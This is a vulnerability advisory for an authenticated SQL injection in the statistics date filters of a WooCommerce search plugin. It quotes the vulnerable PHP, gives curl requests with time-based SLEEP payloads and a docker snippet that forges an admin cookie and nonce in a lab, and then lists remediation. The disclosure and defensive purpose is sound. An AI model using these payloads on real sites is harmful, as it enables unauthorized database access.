# Advisory — YITH WooCommerce Ajax Search 2.30.0 — Authenticated SQL Injection in Statistics Date Filters

## Summary

YITH WooCommerce Ajax Search 2.30.0 concatenates the `from` and `to` date filters directly into SQL statements used by the statistics panel. A user who can access the YITH Ajax Search statistics screen (the default capability is `manage_options`, normally an Administrator) can inject SQL through either filter. The issue was confirmed with a time-based payload using MariaDB `SLEEP(3)`.

The vulnerable code is reached from the authenticated WordPress admin page:

```text
/wp-admin/admin.php?page=yith_wcas_panel&tab=statistic&view_all=searched
```

## Affected component

- Product: YITH WooCommerce Ajax Search
- Tested version: 2.30.0
- WordPress: 7.1.4 (local laboratory)
- WooCommerce: 11.2.2
- PHP: 8.3.36
- Database: MariaDB 11.4.13
- Web server: Apache 2.4.69
- Tested URL: `http://172.25.44.135:8081`
- Required access: authenticated user with `manage_options` (Administrator by default)
- CWE: CWE-89 — Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
- Suggested severity: High
- Suggested CVSS v3.1: `7.7 (AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H)`

## Technical details

The three statistics methods build SQL using unescaped string concatenation:

```php
// includes/data-search/class-yith-wcas-data-search-query-log.php
$where  = ( '' !== $from ) ? " AND search_date > '" . $from . "' " : '';
$where .= ( '' !== $to )   ? " AND search_date < '" . $to . "' " : '';

$wpdb->get_results(
    "SELECT query, COUNT(query) ... WHERE num_results > 0 $where ...",
    ARRAY_A
);
```

The same pattern occurs in:

- `get_top_clicked_products()` — lines 127–135
- `get_top_searches()` — lines 149–157
- `get_top_no_results()` — lines 171–179

The values originate from `$_GET['from']` and `$_GET['to']` in `class-yith-wcas-admin.php` and are only passed through `sanitize_text_field()`. That function does not enforce a `YYYY-MM-DD` date grammar and does not prevent a quote from terminating the SQL string. The admin view then passes the original values to the query methods; truncating the value for the date-picker display does not sanitize the value used by SQL.

The statistics panel is registered with the default `manage_options` capability (`includes/class-yith-wcas-admin.php:165-173`). The detail view requires the normal `ywcas_view_statistic` WordPress nonce, so the test below uses a legitimate Administrator session and nonce.

## Reproduction (local laboratory)

### 1. Seed a positive-result statistic

The delay is easiest to observe when the query-log table contains at least one row with `num_results > 0`. In the tested installation the public telemetry route was used only to seed a lab row:

```bash
curl -sS -G 'http://127.0.0.1:8081/wp-json/ywcas/v1/register' \
  --data-urlencode 'queryString=ywcas-sqli-seed' \
  --data-urlencode 'totalResults=1' \
  --data-urlencode 'itemID=0' \
  --data-urlencode 'lang=en_US'
```

Expected response:

```json
{"loggerID":123}
```

The numeric ID varies. Existing legitimate statistics can be used instead.

### 2. Obtain an Administrator cookie and statistics nonce

In this isolated Docker lab, the following PHP bootstrap prints a fresh non-secure admin cookie (the site is HTTP) and a nonce for the detail view. It must be run inside the WordPress container:

```bash
container=wordpress-audit-lab-wordpress-1

auth_data="$(docker exec "$container" php -r '
require "/var/www/html/wp-load.php";
$exp = time() + 3600;
$token = WP_Session_Tokens::get_instance(1)->create($exp);
echo wp_generate_auth_cookie(1, $exp, "auth", $token), "\n";
echo (defined("COOKIEHASH") ? COOKIEHASH : md5(site_url())), "\n";
wp_set_current_user(1);
echo wp_create_nonce("ywcas_view_statistic"), "\\n";
' 2>/dev/null)"

mapfile -t auth <<< "$auth_data"
auth_cookie="${auth[0]}"
cookie_hash="${auth[1]}"
stats_nonce="${auth[2]}"
```

For an HTTP site the cookie name is `wordpress_${cookie_hash}`. For HTTPS, use the site's secure admin cookie name instead.

### 3. Baseline request

```bash
base='http://127.0.0.1:8081'

curl -sS -o /dev/null \
  -w 'baseline status=%{http_code} elapsed=%{time_total}s\n' \
  -H "Cookie: wordpress_${cookie_hash}=${auth_cookie}" \
  "$base/wp-admin/admin.php?page=yith_wcas_panel&tab=statistic&view_all=searched&_wpnonce=${stats_nonce}&from=2020-01-01&to=2099-01-01"
```

### 4. Time-based SQL injection through `from`

The quote closes the date literal, `SLEEP(3)` is evaluated by MariaDB, and `-- ` comments the remainder of the SQL predicate:

```bash
curl -sS -o /dev/null \
  -w 'injected status=%{http_code} elapsed=%{time_total}s\n' \
  -H "Cookie: wordpress_${cookie_hash}=${auth_cookie}" \
  "$base/wp-admin/admin.php?page=yith_wcas_panel&tab=statistic&view_all=searched&_wpnonce=${stats_nonce}&from=2020-01-01%27%20AND%20SLEEP%283%29--%20&to=2099-01-01"
```

Observed in the laboratory:

```text
baseline status=200 elapsed=0.20s
injected status=200 elapsed=6.18s
```

The detail view executes the statistics query more than once, so the observed delay is approximately two 3-second sleeps. The exact value depends on the number of rows and server load.

### 5. Equivalent injection through `to`

```bash
curl -sS -o /dev/null \
  -w 'to-injected status=%{http_code} elapsed=%{time_total}s\n' \
  -H "Cookie: wordpress_${cookie_hash}=${auth_cookie}" \
  "$base/wp-admin/admin.php?page=yith_wcas_panel&tab=statistic&view_all=searched&_wpnonce=${stats_nonce}&from=2020-01-01&to=2099-01-01%27%20AND%20SLEEP%283%29--%20"
```

Observed in the laboratory:

```text
to-injected status=200 elapsed=6.50s
```

These timings are differential evidence that the input reaches the database as executable SQL. No destructive query or data modification is required to reproduce the issue.

## Impact

An attacker who compromises or is granted an account with the panel capability can execute arbitrary SQL expressions in the context of the WordPress database user. The confirmed PoC is time-based; the same injection point can be developed into database disclosure or modification depending on the database account privileges and server SQL mode. This does not by itself provide operating-system command execution.

## Related routes tested

- `GET /wp-json/ywcas/v1/search`: public route registration, but `api_search()` requires the `yith_search_rest` nonce. A missing nonce returned HTTP 401; a valid nonce returned normal search JSON.
- `GET /wp-json/ywcas/v1/register`: intentionally public telemetry route. It inserts a search-log row using `$wpdb->insert()` with format specifiers; SQL injection was not reproduced there. It accepts arbitrary search text, but the statistics templates render query text with `esc_html()`, so the stored `<script>` test did not produce reflected or stored XSS in the tested panel.
- Legacy `admin-ajax.php` search: the fresh block installation did not register the deprecated legacy handler; no public file-management or upload handler was found.

## Non-findings in this review

- No unauthenticated SQL injection was confirmed in the REST search flow.
- No arbitrary upload, file write/delete, LFI, RCE, or path traversal was confirmed. The only direct file read is the language stop-word file selected by `lang`; its contents are used internally and are not returned by the REST response.
- Product/search result output is escaped (`esc_url`, `wp_kses_post`, and `esc_html` paths were observed); no reflected XSS was reproduced.
- PHP lint completed successfully for the plugin's non-bundled PHP files.

## Remediation

1. Accept only a strict date format (for example, `^\\d{4}-\\d{2}-\\d{2}(?: \\d{2}:\\d{2}:\\d{2})?$`) and reject all other input.
2. Build every date predicate with `$wpdb->prepare()` and `%s` placeholders. Do this consistently in `get_top_searches()`, `get_top_clicked_products()`, and `get_top_no_results()`.
3. Keep `LIMIT` and `OFFSET` values integer-cast or parameterized; do not concatenate request values into SQL.
4. Add a capability check to the statistics AJAX handler in addition to its nonce check.
5. Add regression tests using quote, comment, boolean, and time-based payloads for both `from` and `to`.

## Laboratory cleanup

The temporary query-log rows created for this validation were removed after testing. No plugin source files were modified.
